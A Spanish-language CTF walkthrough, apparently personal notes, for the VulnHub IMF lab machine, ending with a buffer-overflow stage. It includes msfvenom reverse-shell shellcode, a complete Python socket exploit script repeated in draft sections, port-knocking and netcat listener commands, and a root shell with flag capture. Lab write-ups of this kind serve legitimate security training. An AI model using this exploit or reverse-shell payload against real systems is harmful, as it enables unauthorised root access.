# CONFIGURACIÓN
TARGET_IP = "172.16.23.129"
TARGET_PORT = 7788
AGENT_ID = "48093572"
OFFSET = 168

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.23.1 LPORT=443 -f python -b "\\x00\\x0a\\x0d"
buf =  b""
buf += b"\\xdb\\xda\\xbb\\x14\\x85\\x1c\\x15\\xd9\\x74\\x24\\xf4\\x5e"
buf += b"\\x2b\\xc9\\xb1\\x12\\x83\\xee\\xfc\\x31\\x5e\\x13\\x03\\x4a"
buf += b"\\x96\\xfe\\xe0\\x43\\x43\\x09\\xe9\\xf0\\x30\\xa5\\x84\\xf4"
buf += b"\\x3f\\xa8\\xe9\\x9e\\xf2\\xab\\x99\\x07\\xbd\\x93\\x50\\x37"
buf += b"\\xf4\\x92\\x93\\x5f\\xab\\x75\\x73\\x9e\\xdb\\x77\\x7b\\xa1"
buf += b"\\xa0\\xf1\\x9a\\x11\\xb0\\x51\\x0c\\x02\\x8e\\x51\\x27\\x45"
buf += b"\\x3d\\xd5\\x65\\xed\\xd0\\xf9\\xfa\\x85\\x44\\x29\\xd2\\x37"
buf += b"\\xfc\\xbc\\xcf\\xe5\\xad\\x37\\xee\\xb9\\x59\\x85\\x71"

# Padding para alcanzar el offset
padding = b"A" * (OFFSET - len(buf))

# Dirección de retorno (0x08048563 en little-endian para x86)
# En x86 de 32 bits: direcciones se escriben invertidas
ret_address = b"\\x63\\x85\\x04\\x08"

# Construcción del payload completo
payload = buf + padding + ret_address + b"\\n"

print("[*] Conectando a {}:{}".format(TARGET_IP, TARGET_PORT))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))

print("[*] Enviando ID del agente: {}".format(AGENT_ID))
s.send((AGENT_ID + "\\n").encode())
data = s.recv(1024)
print("[*] Respuesta: {}".format(data[:50]))

print("[*] Enviando opción 3 (Buffer Overflow)")
s.send(b"3\\n")
data = s.recv(1024)
print("[*] Respuesta: {}".format(data[:50]))

print("[*] Enviando payload...")
s.send(payload)

print("[+] Payload enviado. Revisa tu listener de netcat.")
s.close()
```

**Desglose del payload:**

```
[Shellcode ~80 bytes]      ← Código que se ejecutará
[Padding ~88 bytes]        ← Bytes de relleno (A's)
[Ret Address 4 bytes]      ← 0x08048563 en little-endian
[Newline 1 byte]           ← Termina la entrada
```

### 7.6 Ejecución del Exploit

**Paso 1: Port Knocking**

Antes de ejecutar el exploit, debemos realizar port knocking para abrir el puerto 7788:

```bash
knock 172.16.23.129 7482,8279,9467
```

Verificamos que el puerto está abierto:

```bash
nmap -p7788 172.16.23.129
# Puerto 7788/tcp open
```

**Paso 2: Preparar Escucha**

En la máquina atacante preparamos netcat para escuchar:

```bash
nc -lvnp 443
```

**Paso 3: Ejecutar el Exploit**

```bash
python3 bof.py
```

Si todo va bien, recibimos una shell como **root** en el netcat:

```bash
# En el netcat:
$ id
uid=0(root) gid=0(root) groups=0(root)

$ whoami
root
```

**¡Tenemos acceso como root!**

### 7.7 Captura de Flag Final

Navegamos al directorio home de root y capturamos la última flag:

```bash
cat /root/flag6.txt
```

Resultado: `flag6{R2gwc3RQcm90MGMwbHM=}`

Decodificamos:
```bash
echo "R2gwc3RQcm90MGMwbHM=" | base64 -d; echo
```

**Resultado**: **Gh0stProt0c0ls** - ¡Máquina completada!











































Generación de Payload con msfvenom
```bash
# Generar shellcode reverse TCP
msfvenom -p linux/x86/shell_reverse_tcp \
  LHOST=172.16.23.1 \
  LPORT=443 \
  -f python \
  -b "\x00\x0a\x0d"
```

Flags explicadas:
- `-p`: Payload (shell reverso TCP)
- `LHOST`: IP donde escucharemos
- `LPORT`: Puerto donde escucharemos
- `-f python`: Formato de salida (código Python)
EJEMPLO:
![[Pasted image 20251123042220.png]]

### 7.2 Estructura del Exploit

El exploit combina el shellcode, padding para alcanzar el offset, y la dirección de retorno que apunta al shellcode.

**Script Python - Exploit**:

```python
#!/usr/bin/python3

import socket
offset = 168
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  

# PAYLOAD: msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.23.1 LPORT=443 -f python -b "\x00\x0a\x0d"
buf =  b""
buf += b"\xdb\xda\xbb\x14\x85\x1c\x15\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x12\x83\xee\xfc\x31\x5e\x13\x03\x4a"
buf += b"\x96\xfe\xe0\x43\x43\x09\xe9\xf0\x30\xa5\x84\xf4"
buf += b"\x3f\xa8\xe9\x9e\xf2\xab\x99\x07\xbd\x93\x50\x37"
buf += b"\xf4\x92\x93\x5f\xab\x75\x73\x9e\xdb\x77\x7b\xa1"
buf += b"\xa0\xf1\x9a\x11\xb0\x51\x0c\x02\x8e\x51\x27\x45"
buf += b"\x3d\xd5\x65\xed\xd0\xf9\xfa\x85\x44\x29\xd2\x37"
buf += b"\xfc\xbc\xcf\xe5\xad\x37\xee\xb9\x59\x85\x71"

#padding
buf += b"A"*(offset-len(buf))
buf += b"\x63\x85\x04\x08\n"


s.connect(('172.16.23.129', 7788))

s.send(b"48093572\n")
data = s.recv(1024)
s.send(b"3\n")
data = s.recv(1024)
s.send(buf)
```

**Ejecución**:

En la máquina atacante preparamos escucha:
```bash
nc -lvnp 443
```

Ejecutamos el exploit:
```bash
python3 bof.py
```

Si todo va bien, recibimos una shell como **root**:

```bash
$ id
uid=0(root) gid=0(root) groups=0(root)
```

### 7.3 Captura de Flag Final

Navegamos al directorio home de root y capturamos la última flag:

```bash
cat /root/flag6.txt
```

Resultado: `flag6{R2gwc3RQcm90MGMwbHM=}`

Decodificamos:
```bash
echo "R2gwc3RQcm90MGMwbHM=" | base64 -d; echo
```

**Resultado**: **Gh0stProt0c0ls** - ¡Máquina completada!

---

## Resumen de Flags Capturadas

| Flag       | Contenido          | Ubicación                             | Técnica                      |
| ---------- | ------------------ | ------------------------------------- | ---------------------------- |
| **Flag 1** | `allthefiles`      | contact.php - Código Fuente           | Análisis manual              |
| **Flag 2** | `imfadministrator` | index.php - Código Fuente             | Decodificación Base64        |
| **Flag 3** | `continueTOcms`    | Array Injection Authentication Bypass | Auth Bypass + Decodificación |
| **Flag 4** | `uploadr942.php`   | QR code en CMS                        | SQLi + Decodificación QR     |
| **Flag 5** | `agentservices`    | Ejecución Remota de Comandos (RCE)    | RCE + Decodificación         |
| **Flag 6** | `Gh0stProt0c0ls`   | /root/flag6.txt                       | Buffer Overflow + Escalada   |

---

## Reflexiones Finales

> [!abstract] Lecciones Aprendidas
> 
> Este CTF demostró la importancia de:
> 1. **Reconocimiento exhaustivo**: Analizar código fuente, comentarios y metadatos
> 2. **Atencion al detalle**: Las flags eran pistas que guiaban el camino
> 3. **Metodología sistemática**: Desde enumeración básica hasta explotación avanzada
> 4. **Persistencia**: Algunos vectores requerían múltiples intentos y pivoting

## Referencias

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Buffer Overflow Exploitation](https://owasp.org/www-community/attacks/Buffer_Overflow)
- [VulnHub IMF Machine](https://www.vulnhub.com/entry/imf-1,162/)
- [Nmap Official Documentation](https://nmap.org/book/)
- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)
- [msfvenom Documentation](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [GDB Debugger Guide](https://www.gnu.org/software/gdb/documentation/)






--- 

























NOTAS (BORRADO)


ecnontramos agent gracias a la pista de flag

hay un binario,

aplicamos ltrace para ver recorrido,

comparamos

buffer over flow

mvfvenom para crear payload

script de python con socket




TUVE QUE HACER UN KNOCK qY EJECUTAR EL ARCHIVO DIRECTAMENTE EN MI PC

flag6{R2gwc3RQcm90MGMwbHM=}


```python
#!/usr/bin/python3

import socket

offset = 168  

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.23.1 LPORT=443 -f python -b "\x00\x0a\x0d"
buf =  b""
buf += b"\xdb\xda\xbb\x14\x85\x1c\x15\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x12\x83\xee\xfc\x31\x5e\x13\x03\x4a"
buf += b"\x96\xfe\xe0\x43\x43\x09\xe9\xf0\x30\xa5\x84\xf4"
buf += b"\x3f\xa8\xe9\x9e\xf2\xab\x99\x07\xbd\x93\x50\x37"
buf += b"\xf4\x92\x93\x5f\xab\x75\x73\x9e\xdb\x77\x7b\xa1"
buf += b"\xa0\xf1\x9a\x11\xb0\x51\x0c\x02\x8e\x51\x27\x45"
buf += b"\x3d\xd5\x65\xed\xd0\xf9\xfa\x85\x44\x29\xd2\x37"
buf += b"\xfc\xbc\xcf\xe5\xad\x37\xee\xb9\x59\x85\x71"

#padding
buf += b"A"*(offset-len(buf))
buf += b"\x63\x85\x04\x08\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('172.16.23.129', 7788))

s.send(b"48093572\n")
data = s.recv(1024)
s.send(b"3\n")
data = s.recv(1024)
s.send(buf)
```
---


## Resumen de Flags Capturadas

| Flag       | Contenido          | Ubicación                   | Técnica                 |
| ---------- | ------------------ | --------------------------- | ----------------------- |
| **Flag 1** | `allthefiles`      | contact.php - Código Fuente | Análisis manual         |
| **Flag 2** | `imfadministrator` | index.php - Código Fuente   | Decodificación Base64   |
| **Flag 3** | `continueTOcms`    | IMF CMS                     | Enumeración de usuarios |
| **Flag 4** | `uploadr942.php`   | QR code en CMS              | Decodificación QR       |
| **Flag 5** | `agentservices`    | Shell web                   | SQLi + Web shell        |
| **Flag 6** | `Gh0stProt0c0ls`   | /root/flag6.txt             | Buffer Overflow         |
## Referencias

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Buffer Overflow Exploitation](https://owasp.org/www-community/attacks/Buffer_Overflow)
- [VulnHub IMF Machine](https://www.vulnhub.com/entry/imf-1,162/)
- [Nmap Official Documentation](https://nmap.org/book/)
- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)

